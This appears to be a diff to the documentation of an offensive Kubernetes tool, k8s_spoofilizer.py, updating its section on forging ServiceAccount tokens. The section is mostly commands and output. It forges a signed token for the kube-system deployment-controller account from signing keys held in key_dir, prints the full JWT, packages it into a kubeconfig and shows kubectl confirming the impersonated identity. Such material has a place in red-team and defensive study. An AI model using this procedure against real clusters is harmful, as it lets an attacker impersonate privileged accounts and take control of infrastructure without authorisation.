@@ -46,10 +46,10 @@ Testing that all necessary data is present in key_dir/...
 
 ## Forging ServiceAccount Tokens
 
-The following command will forge an token for the `deployment-controller` ServiceAccount in the `kube-system` namespace:
+The following command will forge a token for the `deployment-controller` ServiceAccount in the `kube-system` namespace:
 ```
 $ ./k8s_spoofilizer.py --forge-sa-token kube-system/deployment-controller key_dir/
-Found UID in cache for kube-system/deployment-controller: ed0192c9-6764-46c8-9a4d-7210253782dd
+[+] Found UID in cache for kube-system/deployment-controller: ed0192c9-6764-46c8-9a4d-7210253782dd
 
 Unsigned & unencoded JWT:
 {
@@ -60,55 +60,39 @@ Unsigned & unencoded JWT:
   "aud": [
     "https://kubernetes.default.svc.cluster.local"
   ],
-  "exp": 1740172024,
-  "iat": 1740168424,
+  "exp": 1740257684,
+  "iat": 1740254084,
   "iss": "https://kubernetes.default.svc.cluster.local",
-  "jti": "e53dffaa-87ca-4f7e-a498-0795d45d8b6c",
+  "jti": "7ff720a1-285e-4518-b20f-586a752db523",
   "kubernetes.io": {
     "namespace": "kube-system",
     "serviceaccount": {
       "name": "deployment-controller",
       "uid": "ed0192c9-6764-46c8-9a4d-7210253782dd"
     },
-    "nbf": 1740168424,
+    "nbf": 1740254084,
     "sub": "system:serviceaccount:kube-system:deployment-controller"
   }
 }
 
 Forged ServiceAccount token for kube-system/deployment-controller with TTL of 3600 seconds:
-eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQwMTcyMDI0LCJpYXQiOjE3NDAxNjg0MjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZTUzZGZmYWEtODdjYS00ZjdlLWE0OTgtMDc5NWQ0NWQ4YjZjIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZXBsb3ltZW50LWNvbnRyb2xsZXIiLCJ1aWQiOiJlZDAxOTJjOS02NzY0LTQ2YzgtOWE0ZC03MjEwMjUzNzgyZGQifSwibmJmIjoxNzQwMTY4NDI0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVwbG95bWVudC1jb250cm9sbGVyIn19.Vn_FUr_Vsy0OUQVYeMcB74yQOJacVYj8fSaM-7r6bsHARq10Ei3OB08qkaAeWHqdlnOquFJBzVr3iQSZmI4S2nsQX-N3nSKCxQwbktIdfqzDKKxzWr0cIIQRasRgkJukGNltzkWWsmslwsgeZwYvfeBmJoD3ng11CZWH_WggnOpDgKTiiZX7BrUW1vW5JaR4QywJIuvxlMcKz6NbOiHMKLrDwpfsW6cepU4pD0o5r6GKbMd6YQaWx_eUy9EEeoGDLKvZL4XnIcSQlsbtIzczqBhR_--t98mq47t3LAEycQHZ0AzF3JYbTZGw2mRPouhiixvPthLBzAOCil3ZtOoipg
+eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQwMjU3Njg0LCJpYXQiOjE3NDAyNTQwODQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiN2ZmNzIwYTEtMjg1ZS00NTE4LWIyMGYtNTg2YTc1MmRiNTIzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZXBsb3ltZW50LWNvbnRyb2xsZXIiLCJ1aWQiOiJlZDAxOTJjOS02NzY0LTQ2YzgtOWE0ZC03MjEwMjUzNzgyZGQifSwibmJmIjoxNzQwMjU0MDg0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVwbG95bWVudC1jb250cm9sbGVyIn19.sIL-G3VaXuKOZvByFN-qZCrSK9ppUSP8HJg4wVP9NVzng2uA5afCZjJhdSFEmDSYN4TXWbE1pI9rcRk2ytQakYIbH-JzR0JQjcd5TKZbQxKrVPshaeRhFSvpk0B-2k4mY-ooGOZ-QtezBxeM0K9SAaFxGMjnCpYJSGeyeLg7mFErROJZSBEXyCnLMISRoSpddOiv3_xWMH9N1AKGurhOWFZfIEwKAC4FBM2hR_z3RBgjhP2WWHKWjWV_bd-w9QwistH3iPKydP5bVufQgOipwzAdITCmyMZklp-ldLapOPPu0f43PzQunhY8SnkeOQ4ABm8oy4lgWe1JKNKZnBHhQQ
 
-This token can be tested by putting it into an environment variable named $TOKEN, then running:
+[+] This token can be tested by putting it into an environment variable named $TOKEN, then running:
 curl https://kube-api:6443/apis/authentication.k8s.io/v1/selfsubjectreviews --cacert key_dir//ca.crt -X POST -H "Content-Type: application/yaml" -H "Authorization: Bearer $TOKEN" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'
+
+[+] A kubeconfig file has been created in key_dir/kubeconfig_token_kube-system_deployment-controller. Test it with:
+kubectl --kubeconfig=key_dir/kubeconfig_token_kube-system_deployment-controller auth whoami
 ```
 
-Now we can test that the token works with:
+The output above includes the forged SA token, but the tool also packaged it into a kubeconfig so we can easily use `kubectl`:
 ```
-$ TOKEN=eyJhbGciOiJSUz[...]
-$ curl https://kube-api:6443/apis/authentication.k8s.io/v1/selfsubjectreviews --cacert key_dir//ca.crt -X POST -H "Content-Type: application/yaml" -H "Authorization: Bearer $TOKEN" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'
-{
-  "kind": "SelfSubjectReview",
-  "apiVersion": "authentication.k8s.io/v1",
-  "metadata": {
-    "creationTimestamp": "2025-02-21T20:08:18Z"
-  },
-  "status": {
-    "userInfo": {
-      "username": "system:serviceaccount:kube-system:deployment-controller",
-      "uid": "ed0192c9-6764-46c8-9a4d-7210253782dd",
-      "groups": [
-        "system:serviceaccounts",
-        "system:serviceaccounts:kube-system",
-        "system:authenticated"
-      ],
-      "extra": {
-        "authentication.kubernetes.io/credential-id": [
-          "JTI=89c18eff-9fcf-4968-ae2e-32cda23c21a3"
-        ]
-      }
-    }
-  }
-}
+$ kubectl --kubeconfig=key_dir/kubeconfig_token_kube-system_deployment-controller auth whoami
+ATTRIBUTE                                           VALUE
+Username                                            system:serviceaccount:kube-system:deployment-controller
+UID                                                 ed0192c9-6764-46c8-9a4d-7210253782dd
+Groups                                              [system:serviceaccounts system:serviceaccounts:kube-system system:authenticated]
+Extra: authentication.kubernetes.io/credential-id   [JTI=7ff720a1-285e-4518-b20f-586a752db523]
 ```
 
 Success!
